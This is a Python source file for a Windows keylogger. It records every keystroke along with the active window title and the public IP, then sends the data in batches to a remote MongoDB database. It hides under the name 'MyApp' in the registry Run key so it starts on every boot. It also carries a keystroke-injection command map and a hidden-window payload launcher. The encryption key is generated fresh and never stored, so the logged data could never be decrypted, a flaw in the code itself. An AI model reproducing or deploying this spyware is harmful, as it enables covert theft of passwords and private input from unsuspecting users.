import os
import sys
import time
import datetime
import requests
import pynput
import pyautogui
import pygetwindow
import winreg
import subprocess
from cryptography.fernet import Fernet
from pymongo import MongoClient

# MongoDB connection (replace with your MongoDB URI)
client = MongoClient('your_mongodb_uri')
db = client['keylogger_db']
keylogs_collection = db['keylogs']

# Buffer size for key logs
BUFFER_SIZE = 50
keylog_buffer = []

# Encryption setup
key = Fernet.generate_key()
cipher_suite = Fernet(key)

def encrypt_log(data):
    return cipher_suite.encrypt(data.encode())

def get_public_ip():
    """Fetches the public IP of the machine."""
    try:
        response = requests.get('https://api.ipify.org', timeout=10)
        return response.text
    except requests.RequestException:
        return "Unknown IP"

# Get the public IP at the start to reduce frequent requests
public_ip = get_public_ip()

class Keylogger:
    def __init__(self):
        self.public_ip = public_ip

    def on_press(self, key):
        """Handles key press events, buffers them, and sends to MongoDB."""
        try:
            key_pressed = key.char if hasattr(key, 'char') else str(key)
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            active_window = pygetwindow.getActiveWindow()
            window_title = active_window.title if active_window else "Unknown Window"

            # Buffer the keystrokes
            keylog_buffer.append({
                "timestamp": current_time,
                "public_ip": self.public_ip,
                "window_title": window_title,
                "key_pressed": encrypt_log(key_pressed).decode()
            })

            # Insert keylogs to MongoDB when buffer is full
            if len(keylog_buffer) >= BUFFER_SIZE:
                keylogs_collection.insert_many(keylog_buffer)
                keylog_buffer.clear()
        except Exception as e:
            print(f"Error logging key: {e}")

    def start_keylogger(self):
        """Starts the keylogger."""
        with pynput.keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

def add_to_startup():
    """Adds the script to startup using Windows registry."""
    try:
        exe_path = os.path.realpath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "MyApp", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

# Command map for dynamic payload execution
command_map = {
    "STRING": lambda arg: pyautogui.typewrite(arg),
    "ENTER": lambda _: pyautogui.press('enter'),
    "GUI": lambda arg: pyautogui.hotkey('win', arg.lower())
}

def execute_command(command):
    """Executes the payload commands dynamically."""
    try:
        parts = command.split(' ', 1)
        if len(parts) > 1:
            action, arg = parts
        else:
            action, arg = parts[0], None

        if action in command_map:
            command_map[action](arg)
        else:
            print(f"Unknown command: {command}")
    except Exception as e:
        print(f"Error executing command: {e}")

def execute_payload(file_path):
    """Executes the payload in a hidden window."""
    try:
        subprocess.Popen(file_path, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"Failed to execute payload: {e}")

if __name__ == "__main__":
    # Add to startup
    add_to_startup()

    # Start keylogger
    keylogger = Keylogger()
    keylogger.start_keylogger()
